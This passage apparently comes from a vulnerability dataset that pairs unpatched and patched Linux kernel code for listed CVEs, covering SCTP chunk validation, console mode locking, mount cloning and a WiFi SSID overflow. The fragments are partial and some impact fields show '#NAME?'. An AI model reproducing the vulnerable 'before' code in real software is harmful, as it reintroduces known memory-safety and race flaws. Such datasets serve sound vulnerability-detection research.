 return sctp_sf_tabort_8_4_8(net, ep, asoc, type, arg, commands);

 /* Make sure that the INIT chunk has a valid length.
	 * In this case, we generate a protocol violation since we have
	 * an association established.
 */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_init_chunk)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

 if (SCTP_INPUT_CB(chunk->skb)->encap_port != chunk->transport->encap_port)
 return sctp_sf_new_encap_port(net, ep, asoc, type, arg, commands);

	 * its peer.
 */
 if (sctp_state(asoc, SHUTDOWN_ACK_SENT)) {
		disposition = sctp_sf_do_9_2_reshutack(net, ep, asoc,
 SCTP_ST_CHUNK(chunk->chunk_hdr->type),
				chunk, commands);
 if (SCTP_DISPOSITION_NOMEM == disposition)
 goto nomem;

	 * enough for the chunk header.  Cookie length verification is
	 * done later.
 */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);



 /* ""Decode"" the chunk.  We have no optional parameters so we
	 * are in good shape.
 */
 if (SCTP_ADDR_DEL ==
 sctp_bind_addr_state(&asoc->base.bind_addr, &chunk->dest))
 return sctp_sf_discard_chunk(net, ep, asoc, type, arg, commands);

 if (!sctp_err_chunk_valid(chunk))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
 */
 if (SCTP_ADDR_DEL ==
 sctp_bind_addr_state(&asoc->base.bind_addr, &chunk->dest))
 return sctp_sf_discard_chunk(net, ep, asoc, type, arg, commands);

 if (!sctp_err_chunk_valid(chunk))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
 */
 if (SCTP_ADDR_DEL ==
 sctp_bind_addr_state(&asoc->base.bind_addr, &chunk->dest))
 return sctp_sf_discard_chunk(net, ep, asoc, type, arg, commands);

 if (!sctp_err_chunk_valid(chunk))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
 * that belong to this association, it should discard the INIT chunk and
 * retransmit the SHUTDOWN ACK chunk.
 */
enum sctp_disposition sctp_sf_do_9_2_reshutack(
 struct net *net,
 const struct sctp_endpoint *ep,
 const struct sctp_association *asoc,
 const union sctp_subtype type,
 void *arg,
 struct sctp_cmd_seq *commands)
{
 struct sctp_chunk *chunk = arg;
 struct sctp_chunk *reply;
 return SCTP_DISPOSITION_NOMEM;
}





















/*
 * sctp_sf_do_ecn_cwr
 *

 SCTP_INC_STATS(net, SCTP_MIB_OUTOFBLUES);




	ch = (struct sctp_chunkhdr *)chunk->chunk_hdr;
 do {
 /* Report violation if the chunk is less then minimal */

 SCTP_INC_STATS(net, SCTP_MIB_OUTCTRLCHUNKS);

 /* If the chunk length is invalid, we don't want to process
	 * the reset of the packet.
 */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr)))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* We need to discard the rest of the packet to prevent
	 * potential boomming attacks from additional bundled chunks.
	 * This is documented in SCTP Threats ID.
{
 struct sctp_chunk *chunk = arg;




 /* Make sure that the SHUTDOWN_ACK chunk has a valid length. */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
	}






 /* ADD-IP: Section 4.1.1
	 * This chunk MUST be sent in an authenticated way by using
	 * the mechanism defined in [I-D.ietf-tsvwg-sctp-auth]. If this chunk
 */
 if (!asoc->peer.asconf_capable ||
	    (!net->sctp.addip_noauth && !chunk->auth))
 return sctp_sf_discard_chunk(net, ep, asoc, type, arg,
					     commands);

 /* Make sure that the ASCONF ADDIP chunk has a valid length.  */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_addip_chunk)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

	hdr = (struct sctp_addiphdr *)chunk->skb->data;
	serial = ntohl(hdr->serial);
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
	}







 /* ADD-IP, Section 4.1.2:
	 * This chunk MUST be sent in an authenticated way by using
	 * the mechanism defined in [I-D.ietf-tsvwg-sctp-auth]. If this chunk
 */
 if (!asoc->peer.asconf_capable ||
	    (!net->sctp.addip_noauth && !asconf_ack->auth))
 return sctp_sf_discard_chunk(net, ep, asoc, type, arg,
					     commands);

 /* Make sure that the ADDIP chunk has a valid length.  */
 if (!sctp_chunk_length_valid(asconf_ack,
 sizeof(struct sctp_addip_chunk)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

	addip_hdr = (struct sctp_addiphdr *)asconf_ack->skb->data;
	rcvd_serial = ntohl(addip_hdr->serial);
{
 struct sctp_chunk *chunk = arg;




 /* Make sure that the chunk has a valid length.
	 * Since we don't know the chunk type, we use a general
	 * chunkhdr structure to make a comparison.
{
 struct sctp_chunk *chunk = arg;




 /* Make sure that the chunk has a valid length. */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
		 * yet.
 */
 switch (chunk->chunk_hdr->type) {

 case SCTP_CID_INIT_ACK:
		{
 struct sctp_initack_chunk *initack;
"," void *arg,
 struct sctp_cmd_seq *commands);

static enum sctp_disposition
__sctp_sf_do_9_2_reshutack(struct net *net, const struct sctp_endpoint *ep,
 const struct sctp_association *asoc,
 const union sctp_subtype type, void *arg,
 struct sctp_cmd_seq *commands);

/* Small helper function that checks if the chunk length
 * is of the appropriate length.  The 'required_length' argument
 * is set to be the size of a specific chunk we are testing.
 if (!chunk->singleton)
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* Make sure that the INIT chunk has a valid length.
	 * Normally, this would cause an ABORT with a Protocol Violation
	 * error, but since we don't have an association, we'll
	 * just discard the packet.
 */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_init_chunk)))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* If the packet is an OOTB packet which is temporarily on the
	 * control endpoint, respond with an ABORT.
 */
 if (chunk->sctp_hdr->vtag != 0)
 return sctp_sf_tabort_8_4_8(net, ep, asoc, type, arg, commands);









 /* If the INIT is coming toward a closing socket, we'll send back
	 * and ABORT.  Essentially, this catches the race of INIT being
	 * backloged to the socket at the same time as the user issues close().
 struct sock *sk;
 int error = 0;

 if (asoc && !sctp_vtag_verify(chunk, asoc))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* If the packet is an OOTB packet which is temporarily on the
	 * control endpoint, respond with an ABORT.
 */
	 * in sctp_unpack_cookie().
 */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

 /* If the endpoint is not listening or if the number of associations
	 * on the TCP-style socket exceed the max backlog, respond with an
 if (!chunk->singleton)
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* Make sure that the INIT chunk has a valid length. */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_init_chunk)))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* 3.1 A packet containing an INIT chunk MUST have a zero Verification
	 * Tag.
 */
 if (chunk->sctp_hdr->vtag != 0)
 return sctp_sf_tabort_8_4_8(net, ep, asoc, type, arg, commands);









 if (SCTP_INPUT_CB(chunk->skb)->encap_port != chunk->transport->encap_port)
 return sctp_sf_new_encap_port(net, ep, asoc, type, arg, commands);

	 * its peer.
 */
 if (sctp_state(asoc, SHUTDOWN_ACK_SENT)) {
		disposition = __sctp_sf_do_9_2_reshutack(net, ep, asoc,
  SCTP_ST_CHUNK(chunk->chunk_hdr->type),
  chunk, commands);
 if (SCTP_DISPOSITION_NOMEM == disposition)
 goto nomem;

	 * enough for the chunk header.  Cookie length verification is
	 * done later.
 */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr))) {
 if (!sctp_vtag_verify(chunk, asoc))
			asoc = NULL;
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg, commands);
	}

 /* ""Decode"" the chunk.  We have no optional parameters so we
	 * are in good shape.
 */
 if (SCTP_ADDR_DEL ==
 sctp_bind_addr_state(&asoc->base.bind_addr, &chunk->dest))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 if (!sctp_err_chunk_valid(chunk))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
 */
 if (SCTP_ADDR_DEL ==
 sctp_bind_addr_state(&asoc->base.bind_addr, &chunk->dest))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 if (!sctp_err_chunk_valid(chunk))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
 */
 if (SCTP_ADDR_DEL ==
 sctp_bind_addr_state(&asoc->base.bind_addr, &chunk->dest))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 if (!sctp_err_chunk_valid(chunk))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
 * that belong to this association, it should discard the INIT chunk and
 * retransmit the SHUTDOWN ACK chunk.
 */
static enum sctp_disposition
__sctp_sf_do_9_2_reshutack(struct net *net, const struct sctp_endpoint *ep,
 const struct sctp_association *asoc,
 const union sctp_subtype type, void *arg,
 struct sctp_cmd_seq *commands)


{
 struct sctp_chunk *chunk = arg;
 struct sctp_chunk *reply;
 return SCTP_DISPOSITION_NOMEM;
}

enum sctp_disposition
sctp_sf_do_9_2_reshutack(struct net *net, const struct sctp_endpoint *ep,
 const struct sctp_association *asoc,
 const union sctp_subtype type, void *arg,
 struct sctp_cmd_seq *commands)
{
 struct sctp_chunk *chunk = arg;

 if (!chunk->singleton)
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_init_chunk)))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 if (chunk->sctp_hdr->vtag != 0)
 return sctp_sf_tabort_8_4_8(net, ep, asoc, type, arg, commands);

 return __sctp_sf_do_9_2_reshutack(net, ep, asoc, type, arg, commands);
}

/*
 * sctp_sf_do_ecn_cwr
 *

 SCTP_INC_STATS(net, SCTP_MIB_OUTOFBLUES);

 if (asoc && !sctp_vtag_verify(chunk, asoc))
		asoc = NULL;

	ch = (struct sctp_chunkhdr *)chunk->chunk_hdr;
 do {
 /* Report violation if the chunk is less then minimal */

 SCTP_INC_STATS(net, SCTP_MIB_OUTCTRLCHUNKS);







 /* We need to discard the rest of the packet to prevent
	 * potential boomming attacks from additional bundled chunks.
	 * This is documented in SCTP Threats ID.
{
 struct sctp_chunk *chunk = arg;

 if (!sctp_vtag_verify(chunk, asoc))
		asoc = NULL;

 /* Make sure that the SHUTDOWN_ACK chunk has a valid length. */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
	}

 /* Make sure that the ASCONF ADDIP chunk has a valid length.  */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_addip_chunk)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

 /* ADD-IP: Section 4.1.1
	 * This chunk MUST be sent in an authenticated way by using
	 * the mechanism defined in [I-D.ietf-tsvwg-sctp-auth]. If this chunk
 */
 if (!asoc->peer.asconf_capable ||
	    (!net->sctp.addip_noauth && !chunk->auth))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);







	hdr = (struct sctp_addiphdr *)chunk->skb->data;
	serial = ntohl(hdr->serial);
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
	}

 /* Make sure that the ADDIP chunk has a valid length.  */
 if (!sctp_chunk_length_valid(asconf_ack,
 sizeof(struct sctp_addip_chunk)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

 /* ADD-IP, Section 4.1.2:
	 * This chunk MUST be sent in an authenticated way by using
	 * the mechanism defined in [I-D.ietf-tsvwg-sctp-auth]. If this chunk
 */
 if (!asoc->peer.asconf_capable ||
	    (!net->sctp.addip_noauth && !asconf_ack->auth))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);








	addip_hdr = (struct sctp_addiphdr *)asconf_ack->skb->data;
	rcvd_serial = ntohl(addip_hdr->serial);
{
 struct sctp_chunk *chunk = arg;

 if (asoc && !sctp_vtag_verify(chunk, asoc))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* Make sure that the chunk has a valid length.
	 * Since we don't know the chunk type, we use a general
	 * chunkhdr structure to make a comparison.
{
 struct sctp_chunk *chunk = arg;

 if (!sctp_vtag_verify(chunk, asoc))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* Make sure that the chunk has a valid length. */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr)))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
		 * yet.
 */
 switch (chunk->chunk_hdr->type) {
 case SCTP_CID_INIT:
 case SCTP_CID_INIT_ACK:
		{
 struct sctp_initack_chunk *initack;
"
2022,,CVE-2021-3760,,
2022,,CVE-2021-3753," *
 * XXX It should at least call into the driver, fbdev's definitely need to
 * restore their engine state. --BenH


 */
static int vt_kdsetmode(struct vc_data *vc, unsigned long mode)
{
 return -EINVAL;
	}

 /* FIXME: this needs the console lock extending */
 if (vc->vc_mode == mode)
 return 0;

 return 0;

 /* explicitly blank/unblank the screen if switching modes */
 console_lock();
 if (mode == KD_TEXT)
 do_unblank_screen(1);
 else
 do_blank_screen(1);
 console_unlock();

 return 0;
}
 if (!perm)
 return -EPERM;

 return vt_kdsetmode(vc, arg);




 case KDGETMODE:
 return put_user(vc->vc_mode, (int __user *)arg);
"," *
 * XXX It should at least call into the driver, fbdev's definitely need to
 * restore their engine state. --BenH
 *
 * Called with the console lock held.
 */
static int vt_kdsetmode(struct vc_data *vc, unsigned long mode)
{
 return -EINVAL;
	}


 if (vc->vc_mode == mode)
 return 0;

 return 0;

 /* explicitly blank/unblank the screen if switching modes */

 if (mode == KD_TEXT)
 do_unblank_screen(1);
 else
 do_blank_screen(1);


 return 0;
}
 if (!perm)
 return -EPERM;

 console_lock();
		ret = vt_kdsetmode(vc, arg);
 console_unlock();
 return ret;

 case KDGETMODE:
 return put_user(vc->vc_mode, (int __user *)arg);
"
2022,,CVE-2021-3752,,
2022,DoS ,CVE-2021-3744,"				    in_place ? DMA_BIDIRECTIONAL
					     : DMA_TO_DEVICE);
 if (ret)
 goto e_ctx;

 if (in_place) {
			dst = src;
	op.u.aes.size = 0;
	ret = cmd_q->ccp->vdata->perform->aes(&op);
 if (ret)
 goto e_dst;

 if (aes->action == CCP_AES_ACTION_ENCRYPT) {
 /* Put the ciphered tag after the ciphertext. */
		ret = ccp_init_dm_workarea(&tag, cmd_q, authsize,
					   DMA_BIDIRECTIONAL);
 if (ret)
 goto e_tag;
		ret = ccp_set_dm_area(&tag, 0, p_tag, 0, authsize);
 if (ret)
 goto e_tag;



		ret = crypto_memneq(tag.address, final_wa.address,
				    authsize) ? -EBADMSG : 0;
 ccp_dm_free(&tag);
	}

e_tag:
 ccp_dm_free(&final_wa);

e_dst:
","				    in_place ? DMA_BIDIRECTIONAL
					     : DMA_TO_DEVICE);
 if (ret)
 goto e_aad;

 if (in_place) {
			dst = src;
	op.u.aes.size = 0;
	ret = cmd_q->ccp->vdata->perform->aes(&op);
 if (ret)
 goto e_final_wa;

 if (aes->action == CCP_AES_ACTION_ENCRYPT) {
 /* Put the ciphered tag after the ciphertext. */
		ret = ccp_init_dm_workarea(&tag, cmd_q, authsize,
					   DMA_BIDIRECTIONAL);
 if (ret)
 goto e_final_wa;
		ret = ccp_set_dm_area(&tag, 0, p_tag, 0, authsize);
 if (ret) {
 ccp_dm_free(&tag);
 goto e_final_wa;
		}

		ret = crypto_memneq(tag.address, final_wa.address,
				    authsize) ? -EBADMSG : 0;
 ccp_dm_free(&tag);
	}

e_final_wa:
 ccp_dm_free(&final_wa);

e_dst:
"
2022,#NAME?,CVE-2021-3743," goto err;
	}

 if (len != ALIGN(size, 4) + hdrlen)
 goto err;

 if (cb->dst_port != QRTR_PORT_CTRL && cb->type != QRTR_TYPE_DATA &&
"," goto err;
	}

 if (!size || len != ALIGN(size, 4) + hdrlen)
 goto err;

 if (cb->dst_port != QRTR_PORT_CTRL && cb->type != QRTR_TYPE_DATA &&
"
2022,#NAME?,CVE-2021-3739,"
 if (IS_ERR(device)) {
 if (PTR_ERR(device) == -ENOENT &&
 strcmp(device_path, ""missing"") == 0)
			ret = BTRFS_ERROR_DEV_MISSING_NOT_FOUND;
 else
			ret = PTR_ERR(device);
","
 if (IS_ERR(device)) {
 if (PTR_ERR(device) == -ENOENT &&
 device_path && strcmp(device_path, ""missing"") == 0)
			ret = BTRFS_ERROR_DEV_MISSING_NOT_FOUND;
 else
			ret = PTR_ERR(device);
"
2022,,CVE-2021-3732," namespace_unlock();
}















/**
 * clone_private_mount - create a private clone of a path
 * @path: path to clone
 struct mount *old_mnt = real_mount(path->mnt);
 struct mount *new_mnt;


 if (IS_MNT_UNBINDABLE(old_mnt))
 return ERR_PTR(-EINVAL);







	new_mnt = clone_mnt(old_mnt, path->dentry, CL_PRIVATE);


 if (IS_ERR(new_mnt))
 return ERR_CAST(new_mnt);

 /* Longterm mount to be removed by kern_unmount*() */
	new_mnt->mnt_ns = MNT_NS_INTERNAL;

 return &new_mnt->mnt;




}
EXPORT_SYMBOL_GPL(clone_private_mount);

 return err;
}

static bool has_locked_children(struct mount *mnt, struct dentry *dentry)
{
 struct mount *child;
 list_for_each_entry(child, &mnt->mnt_mounts, mnt_child) {
 if (!is_subdir(child->mnt_mountpoint, dentry))
 continue;

 if (child->mnt.mnt_flags & MNT_LOCKED)
 return true;
	}
 return false;
}

static struct mount *__do_loopback(struct path *old_path, int recurse)
{
 struct mount *mnt = ERR_PTR(-EINVAL), *old = real_mount(old_path->mnt);
"," namespace_unlock();
}

static bool has_locked_children(struct mount *mnt, struct dentry *dentry)
{
 struct mount *child;

 list_for_each_entry(child, &mnt->mnt_mounts, mnt_child) {
 if (!is_subdir(child->mnt_mountpoint, dentry))
 continue;

 if (child->mnt.mnt_flags & MNT_LOCKED)
 return true;
	}
 return false;
}

/**
 * clone_private_mount - create a private clone of a path
 * @path: path to clone
 struct mount *old_mnt = real_mount(path->mnt);
 struct mount *new_mnt;

 down_read(&namespace_sem);
 if (IS_MNT_UNBINDABLE(old_mnt))
 goto invalid;

 if (!check_mnt(old_mnt))
 goto invalid;

 if (has_locked_children(old_mnt, path->dentry))
 goto invalid;

	new_mnt = clone_mnt(old_mnt, path->dentry, CL_PRIVATE);
 up_read(&namespace_sem);

 if (IS_ERR(new_mnt))
 return ERR_CAST(new_mnt);

 /* Longterm mount to be removed by kern_unmount*() */
	new_mnt->mnt_ns = MNT_NS_INTERNAL;

 return &new_mnt->mnt;

invalid:
 up_read(&namespace_sem);
 return ERR_PTR(-EINVAL);
}
EXPORT_SYMBOL_GPL(clone_private_mount);

 return err;
}














static struct mount *__do_loopback(struct path *old_path, int recurse)
{
 struct mount *mnt = ERR_PTR(-EINVAL), *old = real_mount(old_path->mnt);
"
2022,,CVE-2021-3715,"			fp = &b->ht[h];
 for (pfp = rtnl_dereference(*fp); pfp;
			     fp = &pfp->next, pfp = rtnl_dereference(*fp)) {
 if (pfp == f) {
					*fp = f->next;
 break;
				}
			}
","			fp = &b->ht[h];
 for (pfp = rtnl_dereference(*fp); pfp;
			     fp = &pfp->next, pfp = rtnl_dereference(*fp)) {
 if (pfp == fold) {
 rcu_assign_pointer(*fp, fold->next);
 break;
				}
			}
"
2021,DoS ,CVE-2021-3679,,
2022,,CVE-2021-3656," /* If SMI is not intercepted, ignore guest SMI intercept as well  */
 if (!intercept_smi)
 vmcb_clr_intercept(c, INTERCEPT_SMI);



}

static void copy_vmcb_control_area(struct vmcb_control_area *dst,
"," /* If SMI is not intercepted, ignore guest SMI intercept as well  */
 if (!intercept_smi)
 vmcb_clr_intercept(c, INTERCEPT_SMI);

 vmcb_set_intercept(c, INTERCEPT_VMLOAD);
 vmcb_set_intercept(c, INTERCEPT_VMSAVE);
}

static void copy_vmcb_control_area(struct vmcb_control_area *dst,
"
2021,,CVE-2021-3655,,
2021,,CVE-2021-3653,,
2021,Overflow ,CVE-2021-3635,,
2021,,CVE-2021-3612,,
2021,,CVE-2021-3573,,
2021,Mem. Corr. ,CVE-2021-3564,,
2021,#NAME?,CVE-2021-3506,,
2021,,CVE-2021-3501,,
2021,Exec Code Overflow Bypass ,CVE-2021-3491,,
2021,Exec Code ,CVE-2021-3490,,
2021,Exec Code ,CVE-2021-3489,,
2021,,CVE-2021-3483,,
2021,Exec Code ,CVE-2021-3444,,
2022,DoS Overflow ,CVE-2021-3428,,
2021,,CVE-2021-3411,,
2021,,CVE-2021-3348,,
2021,Exec Code ,CVE-2021-3347,,
2021,Dir. Trav. ,CVE-2021-3178,,
2022,,CVE-2020-36516,,
2021,,CVE-2020-36387,,
2021,,CVE-2020-36386,,
2021,,CVE-2020-36385,,
2021,,CVE-2020-36322,,
2021,,CVE-2020-36313,,
2021,,CVE-2020-36312,,
2021,DoS ,CVE-2020-36311,,
2021,,CVE-2020-36310,,
2021,Exec Code ,CVE-2020-36158,"
 memset(adhoc_start->ssid, 0, IEEE80211_MAX_SSID_LEN);



 memcpy(adhoc_start->ssid, req_ssid->ssid, req_ssid->ssid_len);

 mwifiex_dbg(adapter, INFO, ""info: ADHOC_S_CMD: SSID = %s\n"",
","
 memset(adhoc_start->ssid, 0, IEEE80211_MAX_SSID_LEN);

 if (req_ssid->ssid_len > IEEE80211_MAX_SSID_LEN)
		req_ssid->ssid_len = IEEE80211_MAX_SSID_LEN;
 memcpy(adhoc_start->ssid, req_ssid->ssid, req_ssid->ssid_len);

 mwifiex_dbg(adapter, INFO, ""info: ADHOC_S_CMD: SSID = %s\n"",
"
2021,#NAME?,CVE-2020-35519,,
2021,DoS ,CVE-2020-35513,,
2021,Bypass ,CVE-2020-35508," /* ok, now we should be set up.. */
	p->pid = pid_nr(pid);
 if (clone_flags & CLONE_THREAD) {
		p->exit_signal = -1;
		p->group_leader = current->group_leader;
		p->tgid = current->tgid;
	} else {
 if (clone_flags & CLONE_PARENT)
			p->exit_signal = current->group_leader->exit_signal;
 else
			p->exit_signal = args->exit_signal;
		p->group_leader = p;
		p->tgid = p->pid;
	}
 if (clone_flags & (CLONE_PARENT|CLONE_THREAD)) {
		p->real_parent = current->real_parent;
		p->parent_exec_id = current->parent_exec_id;




	} else {
		p->real_parent = current;
		p->parent_exec_id = current->self_exec_id;

	}

 klp_copy_process(p);
"," /* ok, now we should be set up.. */
	p->pid = pid_nr(pid);
 if (clone_flags & CLONE_THREAD) {

		p->group_leader = current->group_leader;
		p->tgid = current->tgid;
	} else {




		p->group_leader = p;
		p->tgid = p->pid;
	}
 if (clone_flags & (CLONE_PARENT|CLONE_THREAD)) {
		p->real_parent = current->real_parent;
		p->parent_exec_id = current->parent_exec_id;
 if (clone_flags & CLONE_THREAD)
			p->exit_signal = -1;
 else
			p->exit_signal = current->group_leader->exit_signal;
	} else {
		p->real_parent = current;
		p->parent_exec_id = current->self_exec_id;
		p->exit_signal = args->exit_signal;
	}

 klp_copy_process(p);
"
2022,,CVE-2020-35501,,
2021,#NAME?,CVE-2020-35499,,
2020,,CVE-2020-29661,,
2020,,CVE-2020-29660,,
2020,#NAME?,CVE-2020-29569,,
2020,,CVE-2020-29534,,
2020,,CVE-2020-29374,,
2020,Dir. Trav. ,CVE-2020-29373,,
2020,,CVE-2020-29372,,
2020,,CVE-2020-29371,,
2020,,CVE-2020-29370,,
2020,,CVE-2020-29369,,
2020,,CVE-2020-29368,,
2020,,CVE-2020-28974,,
2020,DoS ,CVE-2020-28941,"
 if (!tty->ops->write)
 return -EOPNOTSUPP;






	speakup_tty = tty;

	ldisc_data = kmalloc(sizeof(*ldisc_data), GFP_KERNEL);
 if (!ldisc_data)


 return -ENOMEM;


 init_completion(&ldisc_data->completion);
	ldisc_data->buf_free = true;
	speakup_tty->disc_data = ldisc_data;


 return 0;
}
","
 if (!tty->ops->write)
 return -EOPNOTSUPP;

 mutex_lock(&speakup_tty_mutex);
 if (speakup_tty) {
 mutex_unlock(&speakup_tty_mutex);
 return -EBUSY;
	}
	speakup_tty = tty;

	ldisc_data = kmalloc(sizeof(*ldisc_data), GFP_KERNEL);
 if (!ldisc_data) {
		speakup_tty = NULL;
 mutex_unlock(&speakup_tty_mutex);
 return -ENOMEM;
	}

 init_completion(&ldisc_data->completion);
	ldisc_data->buf_free = true;
	speakup_tty->disc_data = ldisc_data;
 mutex_unlock(&speakup_tty_mutex);

 return 0;
}
"
2020,,CVE-2020-28915,,
2021,#NAME?,CVE-2020-28588,,
2021,Dir. Trav. ,CVE-2020-28374," return 0;
}

struct xcopy_dev_search_info {
 const unsigned char *dev_wwn;
 struct se_device *found_dev;
};



static int target_xcopy_locate_se_dev_e4_iter(struct se_device *se_dev,
 void *data)
{
 struct xcopy_dev_search_info *info = data;
 unsigned char tmp_dev_wwn[XCOPY_NAA_IEEE_REGEX_LEN];
 int rc;

 if (!se_dev->dev_attrib.emulate_3pc)

 return 0;


 memset(&tmp_dev_wwn[0], 0, XCOPY_NAA_IEEE_REGEX_LEN);
 target_xcopy_gen_naa_ieee(se_dev, &tmp_dev_wwn[0]);

	rc = memcmp(&tmp_dev_wwn[0], info->dev_wwn, XCOPY_NAA_IEEE_REGEX_LEN);
 if (rc != 0)
 return 0;

	info->found_dev = se_dev;
 pr_debug(""XCOPY 0xe4: located se_dev: %p\n"", se_dev);

	rc = target_depend_item(&se_dev->dev_group.cg_item);
 if (rc != 0) {
 pr_err(""configfs_depend_item attempt failed: %d for se_dev: %p\n"",
        rc, se_dev);
 return rc;
	}


 pr_debug(""Called configfs_depend_item for se_dev: %p se_dev->se_dev_group: %p\n"",
		 se_dev, &se_dev->dev_group);
 return 1;
}

static int target_xcopy_locate_se_dev_e4(const unsigned char *dev_wwn,
 struct se_device **found_dev)


{
 struct xcopy_dev_search_info info;
 int ret;

 memset(&info, 0, sizeof(info));
	info.dev_wwn = dev_wwn;

	ret = target_for_each_device(target_xcopy_locate_se_dev_e4_iter, &info);
 if (ret == 1) {
		*found_dev = info.found_dev;
 return 0;
	} else {
 pr_debug_ratelimited(""Unable to locate 0xe4 descriptor for EXTENDED_COPY\n"");
 return -EINVAL;














	}












}

static int target_xcopy_parse_tiddesc_e4(struct se_cmd *se_cmd, struct xcopy_op *xop,

 switch (xop->op_origin) {
 case XCOL_SOURCE_RECV_OP:
		rc = target_xcopy_locate_se_dev_e4(xop->dst_tid_wwn,
						&xop->dst_dev);


 break;
 case XCOL_DEST_RECV_OP:
		rc = target_xcopy_locate_se_dev_e4(xop->src_tid_wwn,
						&xop->src_dev);


 break;
 default:
 pr_err(""XCOPY CSCD descriptor IDs not found in CSCD list - ""

static void xcopy_pt_undepend_remotedev(struct xcopy_op *xop)
{
 struct se_device *remote_dev;

 if (xop->op_origin == XCOL_SOURCE_RECV_OP)
 remote_dev = xop->dst_dev;
 else
		remote_dev = xop->src_dev;

 pr_debug(""Calling configfs_undepend_item for""
 "" remote_dev: %p remote_dev->dev_group: %p\n"",
		  remote_dev, &remote_dev->dev_group.cg_item);

 target_undepend_item(&remote_dev->dev_group.cg_item);
}

static void xcopy_pt_release_cmd(struct se_cmd *se_cmd)
 struct se_device *dst_dev;
 unsigned char dst_tid_wwn[XCOPY_NAA_IEEE_REGEX_LEN];
 unsigned char local_dev_wwn[XCOPY_NAA_IEEE_REGEX_LEN];


 sector_t src_lba;
 sector_t dst_lba;
"," return 0;
}

/**
 * target_xcopy_locate_se_dev_e4_iter - compare XCOPY NAA device identifiers
 *
 * @se_dev: device being considered for match
 * @dev_wwn: XCOPY requested NAA dev_wwn
 * @return: 1 on match, 0 on no-match
 */
static int target_xcopy_locate_se_dev_e4_iter(struct se_device *se_dev,
 const unsigned char *dev_wwn)
{

 unsigned char tmp_dev_wwn[XCOPY_NAA_IEEE_REGEX_LEN];
 int rc;

 if (!se_dev->dev_attrib.emulate_3pc) {
 pr_debug(""XCOPY: emulate_3pc disabled on se_dev %p\n"", se_dev);
 return 0;
	}

 memset(&tmp_dev_wwn[0], 0, XCOPY_NAA_IEEE_REGEX_LEN);
 target_xcopy_gen_naa_ieee(se_dev, &tmp_dev_wwn[0]);

	rc = memcmp(&tmp_dev_wwn[0], dev_wwn, XCOPY_NAA_IEEE_REGEX_LEN);







 if (rc != 0) {
 pr_debug(""XCOPY: skip non-matching: %*ph\n"",
 	 XCOPY_NAA_IEEE_REGEX_LEN, tmp_dev_wwn);
 return 0;
	}
 pr_debug(""XCOPY 0xe4: located se_dev: %p\n"", se_dev);



 return 1;
}

static int target_xcopy_locate_se_dev_e4(struct se_session *sess,
 const unsigned char *dev_wwn,
 struct se_device **_found_dev,
 struct percpu_ref **_found_lun_ref)
{
 struct se_dev_entry *deve;
 struct se_node_acl *nacl;
 struct se_lun *this_lun = NULL;
 struct se_device *found_dev = NULL;

 /* cmd with NULL sess indicates no associated $FABRIC_MOD */
 if (!sess)
 goto err_out;

 pr_debug(""XCOPY 0xe4: searching for: %*ph\n"",
		 XCOPY_NAA_IEEE_REGEX_LEN, dev_wwn);

	nacl = sess->se_node_acl;
 rcu_read_lock();
 hlist_for_each_entry_rcu(deve, &nacl->lun_entry_hlist, link) {
 struct se_device *this_dev;
 int rc;

		this_lun = rcu_dereference(deve->se_lun);
